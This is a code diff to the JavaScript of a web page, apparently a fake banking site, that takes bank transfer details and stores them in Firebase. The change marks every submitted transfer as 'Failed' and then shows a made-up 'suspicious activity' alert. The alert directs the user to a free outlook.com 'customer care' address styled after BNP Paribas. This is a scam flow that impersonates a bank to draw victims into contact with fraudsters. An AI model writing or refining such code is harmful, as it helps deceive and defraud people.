@@ -31,7 +31,9 @@ onAuthStateChanged(auth, async (user) => {
   const db = getFirestore(app);
   const docRef = doc(db, "Transactions", user.email);
   const docSnap = await getDoc(docRef);
+  const spinner = document.getElementById("spinner");
   transactionForm.addEventListener("submit", async (e) => {
+    spinner.style.display = "block";
     e.preventDefault();
     if (
       transactionForm["beneficiaryAccount"].value == "" ||
@@ -68,7 +70,7 @@ onAuthStateChanged(auth, async (user) => {
           name: name,
           bank: bank,
           amount: amount,
-          status: "Pending",
+          status: "Failed",
           recipientAddress: recipientAddress,
           bankAddress: bankAddress,
           routingNumber: routingNumber,
@@ -81,11 +83,15 @@ onAuthStateChanged(auth, async (user) => {
         }),
       });
 
-      Swal.fire({
-        title: "Pending",
-        text: "Transaction Pending",
-        icon: "warning",
-      });
+      setTimeout(function () {
+        spinner.style.display = "none";
+        Swal.fire({
+          title: "Transaction Failed",
+          text: "We Have Detected A Suspicious Activity Going On In Your Account Please Contact Customer Care At: Bnpparibascustomercare@outlook.com",
+          icon: "error",
+        });
+      }, 2000);
+
       transactionForm.reset();
     }
   });
